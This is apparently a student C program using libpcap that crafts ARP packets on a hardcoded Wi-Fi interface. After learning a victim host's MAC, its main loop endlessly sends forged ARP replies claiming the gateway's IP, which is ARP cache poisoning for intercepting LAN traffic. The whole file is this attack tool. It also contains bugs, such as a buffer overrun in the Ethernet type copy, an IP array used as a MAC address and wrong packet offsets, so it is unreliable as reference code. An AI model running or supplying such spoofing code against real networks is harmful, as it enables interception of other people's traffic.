#include <stdlib.h>
#include <stdio.h>

#include <string.h>
#include <pcap/pcap.h>

#include <arpa/inet.h>
#include <stdint.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <zconf.h>
#include <netinet/in.h>

#define true 1
#define false 0

#define ETHER_NET 1
#define IP 0x0800
#define ARP_req 0x0001
#define ARP_rep 0x0002
#define ARP 0x0806
#define MAC_SIZE 6
#define IP_SIZE 4
#define OP_SIZE 2
#define ARP_REQUEST 0x0001
#define ARP_REPLY 0x0002


typedef struct{
    u_char hat[2]; // Hardware address Type - 2byte
    u_char pat[2]; // Protocol address Type - 2byte
    u_char hlen[1]; // Hardware address's length - 1byte
    u_char plen[1]; // protocol address's length - 1byte
    u_char opcode[2]; // reply & request - 2byte
    u_char srcMAC[6]; // source protocol address - 6byte
    u_char srcIP[4]; // Source protocol Address - 4byte
    u_char dstMAC[6]; // destination protocol address - 6byte
    u_char dstIP[4]; // destination protocol address - 4byte

}ARP_hdr;

// ethernet protocol, ethernet type, arp protocol, arp-operation
typedef struct{
    u_char destination[6];
    u_char source[6];
    u_char Type[2];
}ETHER_hdr;

typedef struct{
    ETHER_hdr eth;
    ARP_hdr arp;
}packet_type;

int isARP(const uint8_t* pck){
    if((pck[12] == 0x08) && (pck[13] == 0x06))
        return 1;
    else
        return 0;
}

int isRep(const uint8_t* pck){
    char OpIsRep = (pck[20]==0x00 && pck[21]==0x02);
    if(OpIsRep){
        return 1;
    }
    return 0;
}

void getSendMac(u_char* MAC, const u_char* pck){
    for(int i = 32;i<32+6;i++){
        MAC[i-32] = pck[i];
    }
}


void getTargetMac(u_char* MAC, const u_char* pck){
    for(int i = 32;i<32+6;i++){
        MAC[i-32] = pck[i];
    }
}

int getMyMac(char* myMac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "wlp0s20f3");
    if(!ioctl(fd, SIOCGIFHWADDR, &s)){
        //printf("\n");
        for(int i =0; i<6; i++){
            myMac[i] = s.ifr_addr.sa_data[i];
            //printf("%x ", myMac[i]);
        }
    }
    return 1;
}

void modifyPAT(packet_type* pck, char value[]){
    memcpy(pck->arp.pat, value, sizeof(*value));
}

void modifyTargetMAC(packet_type* pck, unsigned char value[]){
    for(int i =0; i<MAC_SIZE; i++){
        pck->arp.dstMAC[i] = value[i];
    }
    printf("\n");
    for(int i =0; i<sizeof(pck->arp.dstMAC);i++){
        printf("%02X ", pck->arp.dstMAC[i]);
    }
}

void modifySendertMAC(packet_type* pck, unsigned char value[]){
    for(int i = 0; i<MAC_SIZE; i++){
        pck->arp.srcMAC[i] = value[i];
    }
}

void modifyTargetIP(packet_type* pck, unsigned char value[]){
    for(int i =0; i<IP_SIZE; i++){
        pck->arp.dstIP[i] = value[i];
    }
}

void modifySenderIP(packet_type* pck, unsigned char value[]){
    for(int i =0; i<IP_SIZE; i++){
        pck->arp.srcIP[i] = value[i];
    }
}

void modifyOP(packet_type* pck, int value){
    unsigned char val_arr[2];
    if(value == ARP_REQUEST){
        val_arr[0] = 0x00;
        val_arr[1] = 0x01;
    }
    else if(value == ARP_REPLY){
        val_arr[0] = 0x00;
        val_arr[1] = 0x02;
    }
    for(int i =0; i<OP_SIZE; i++){
        pck->arp.opcode[i] = val_arr[i];
    }
}

void modifyETHDestination(packet_type* pck, unsigned char value[]){
    for(int i = 0; i<MAC_SIZE; i++){
        pck->eth.destination[i] = value[i];
    }
}

void modifyETHSource(packet_type* pck, unsigned char value[]){
    for(int i = 0; i<MAC_SIZE; i++){
        pck->eth.source[i] = value[i];
    }
}

void createPacket(packet_type *pck){

    u_char dest[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    memcpy(pck->eth.destination, dest,  6);
    u_char source[6] = {0xd0, 0xc6, 0x37, 0xd3, 0x10, 0x0d};
    memcpy(pck->eth.source, source, 6);
    u_char type[2] = {0x08, 0x06};
    memcpy(pck->eth.Type, type, 6);
    u_char hat[2] = {0x00, 0x01};
    memcpy(pck->arp.hat, hat, 2);

    u_char pat[2] = {0x08, 0x00};
    memcpy(pck->arp.pat, pat, 2);
    u_char hal[1] = {0x06};
    memcpy(pck->arp.hlen, hal, 1);
    u_char pal[1] = {0x04};
    memcpy(pck->arp.plen, pal, 1);
    u_char opcode[2] = {0x00, 0x01};
    memcpy(pck->arp.opcode, opcode, 2);
    u_char sha[6] = {0x3c, 0xf0, 0x11, 0x28, 0x2b, 0xbb};
    memcpy(pck->arp.srcMAC, sha, 6);
    u_char spa[4] = {0xc0, 0xa8, 0x2b, 0x7,};
    memcpy(pck->arp.srcIP, spa, 4);
    u_char tha[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    memcpy(pck->arp.dstMAC, tha, 6);
    u_char tpa[4] = {0xc0, 0xa8, 0x2b, 43};
    memcpy(pck->arp.dstIP, tpa, 4);
}


int main(int argc, char *argv[])
{
    //{interface sender_ip target_ip}
    // - victimip, gateway
    //TODO packet에서 srcMAC를 gateway(target_ip의 MAC)로
    // dstMAC을 sender_ip의 MAC으로
    packet_type pck;


    u_char myMac[6];
    getMyMac(myMac);
    char* interface = "wlp0s20f3";
    // char* interface = argv[1];
    char sender_ip[] = {192,168,0,11};
    //char* sender_ip = argv[2];
    char gateway_ip[] = {192,168,0,1};
    //char* gateway_ip = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
        return -1;
    }

    struct pcap_pkthdr* header;
    const uint8_t* packet;
    u_char SenderMAC[6];
    packet_type data;
    createPacket(&data);

    // TODO argv로 온 값 대체하기
    // 구조체화 시키기

    pcap_sendpacket(handle, (const u_char*) &data, 42);
    while(true){

        if(pcap_next_ex(handle, &header, &packet) == 0)
            continue;
        //printf("--\n");
         if(isARP(packet) && isRep(packet)){
             printf("--------------\n%02X%02X  %02X%02X", packet[12],packet[13],packet[20],packet[21]);

             //reply 왔을때
             printf("\nREP\n");
             //TODO 맥어드레스 구하기
             getSendMac(SenderMAC, packet);
             // Broadcast통해 reply로 받은 패킷의 Sender MAC address
             for(int i =0;i<sizeof(SenderMAC); i++){
                 printf("%02x ", SenderMAC[i]);
             }
             printf("\n");
             modifyETHDestination(&data, SenderMAC);
             modifyETHSource(&data, gateway_ip);
             modifyTargetMAC(&data, SenderMAC);
             modifySenderIP(&data, gateway_ip);
             modifyOP(&data, ARP_REPLY);

             while(true){
                 pcap_sendpacket(handle, (const u_char*) &data, 42);
             }


         }


    }
    //계속보낼때
    // sender ip:

}